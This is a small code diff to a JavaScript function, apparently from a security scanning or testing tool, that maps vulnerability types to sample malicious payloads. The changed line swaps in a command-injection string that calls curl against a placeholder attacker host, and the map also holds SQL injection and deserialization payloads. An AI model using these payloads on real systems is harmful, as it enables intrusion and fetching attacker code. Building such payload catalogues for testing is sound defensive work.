@@ -121,7 +121,7 @@ const inferMaliciousPayload = (vuln) => {
     'Insecure Deserialization': '{"$type":"System.Windows.Data.ObjectDataProvider"}',
     'Hardcoded Secret': 'AKIAIOSFODNN7EXAMPLE',
     'Cryptographic Failure': '0000000000000000',
-    'Security Misconfiguration': '${{ github.event.issue.title }}',
+    'Security Misconfiguration': 'github.event.issue.title && curl http://attacker.tld/pwn',
     'Business Logic Flaw': 'quantity=-1000',
   };
   return map[type] || '" OR "1"="1';
